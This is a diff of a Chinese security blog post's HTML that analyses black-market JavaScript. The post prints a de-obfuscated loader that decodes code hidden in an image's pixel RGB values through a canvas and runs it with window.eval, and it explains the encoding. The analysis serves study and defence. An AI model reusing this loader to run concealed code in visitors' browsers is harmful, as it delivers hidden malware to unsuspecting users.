@@ -16,7 +16,7 @@
 
   
   <meta name="author" content="Neal" />
-  <meta name="description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码是在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
+  <meta name="description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 最初的代码是经过混淆的，代码经过整理如下：
 var createImgElement = function(urla, b) { var imgElement = document.createElement(&amp;#39;img&amp;#39;); var canvasEle = document.createElement(&amp;#39;canvas&amp;#39;); imgElement[&amp;#39;crossOrigin&amp;#39;] = true; imgElement[&amp;#39;onload&amp;#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&amp;#39;2d&amp;#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &amp;lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext." />
 
@@ -25,7 +25,7 @@ var createImgElement = function(urla, b) { var imgElement = document.createEleme
     <meta name="twitter:card" content="summary" />
     <meta name="twitter:site" content="@gohugoio" />
     <meta name="twitter:title" content="黑产代码解密--利用canvas加载代码" />
-    <meta name="twitter:description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码是在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
+    <meta name="twitter:description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 最初的代码是经过混淆的，代码经过整理如下：
 var createImgElement = function(urla, b) { var imgElement = document.createElement(&amp;#39;img&amp;#39;); var canvasEle = document.createElement(&amp;#39;canvas&amp;#39;); imgElement[&amp;#39;crossOrigin&amp;#39;] = true; imgElement[&amp;#39;onload&amp;#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&amp;#39;2d&amp;#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &amp;lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext." />
     <meta name="twitter:image" content="https://madneal.com/img/avatar.jpg" />
@@ -34,7 +34,7 @@ var createImgElement = function(urla, b) { var imgElement = document.createEleme
   
   <meta property="og:type" content="article" />
   <meta property="og:title" content="黑产代码解密--利用canvas加载代码" />
-  <meta property="og:description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码是在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
+  <meta property="og:description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 最初的代码是经过混淆的，代码经过整理如下：
 var createImgElement = function(urla, b) { var imgElement = document.createElement(&amp;#39;img&amp;#39;); var canvasEle = document.createElement(&amp;#39;canvas&amp;#39;); imgElement[&amp;#39;crossOrigin&amp;#39;] = true; imgElement[&amp;#39;onload&amp;#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&amp;#39;2d&amp;#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &amp;lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext." />
   <meta property="og:url" content="https://madneal.com/post/%E9%BB%91%E4%BA%A7%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%AF%86--%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/" />
@@ -221,9 +221,9 @@ var createImgElement = function(urla, b) { var imgElement = document.createEleme
   <section class="main post-detail">
     <header class="post-header">
       <h1 class="post-title">黑产代码解密--利用canvas加载代码</h1>
-      <p class="post-meta">@Neal · Aug 12, 2018 · 2 min read</p>
+      <p class="post-meta">@Neal · Aug 12, 2018 · 3 min read</p>
     </header>
-    <article class="post-content"><p>前段时间获取到黑产的一些代码，不得不感叹黑产的代码是在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：</p>
+    <article class="post-content"><p>前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：</p>
 
 <p>最初的代码是经过混淆的，代码经过整理如下：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">createImgElement</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">urla</span>, <span style="color:#a6e22e">b</span>) {
@@ -245,16 +245,27 @@ var createImgElement = function(urla, b) { var imgElement = document.createEleme
             <span style="color:#a6e22e">canvasContext</span>.<span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>);
             <span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">code1</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">code1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code1</span>);
             <span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">code2</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">code2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code2</span>);
-            <span style="color:#ae81ff">0</span> <span style="color:#f92672">!=</span> Number(<span style="color:#a6e22e">code</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code1</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code2</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">push</span>(String.<span style="color:#a6e22e">fromCharCode</span>(Number(<span style="color:#a6e22e">code</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code1</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code2</span>)))
+            <span style="color:#ae81ff">0</span> <span style="color:#f92672">!=</span> Number(<span style="color:#a6e22e">code</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code1</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code2</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">push</span>(String.<span style="color:#a6e22e">fromCharCode</span>(Number(<span style="color:#a6e22e">code</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code1</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code2</span>)));
         }
         window.eval(<span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;&#39;</span>));
-        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;&#39;</span>))
-        <span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">b</span>()
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;&#39;</span>));
+        <span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">b</span>();
     }
-    <span style="color:#a6e22e">imgElement</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">urla</span>
+    <span style="color:#a6e22e">imgElement</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">urla</span>;
 };
 </code></pre></div>
 <p>这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。</p>
+
+<p>在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。</p>
+
+<ul>
+<li>R - 红色 (0-255)</li>
+<li>G - 绿色 (0-255)</li>
+<li>B - 蓝色 (0-255)</li>
+<li>A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的)</li>
+</ul>
+
+<p>通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。</p>
 
 <p>这里涉及到一个 canvas 和图片之间的相互转化。下面提供两个相互转化的函数：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">canvasToImg</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fucntion</span>(<span style="color:#a6e22e">image</span>) {
